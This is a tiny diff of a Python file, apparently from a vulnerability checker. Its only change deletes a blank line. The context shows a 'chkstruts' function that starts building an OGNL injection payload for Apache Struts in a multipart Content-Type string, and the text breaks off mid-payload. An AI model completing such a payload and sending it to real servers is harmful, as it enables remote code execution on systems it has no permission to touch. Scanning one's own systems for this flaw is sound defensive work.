@@ -1,6 +1,5 @@
 from linker import *
 
-
 def chkstruts(endpoint,timeout=30):
     url = helpers.urlify(endpoint)['URL_FILE']
     ognl_payload = ".multipart/form-data~${"
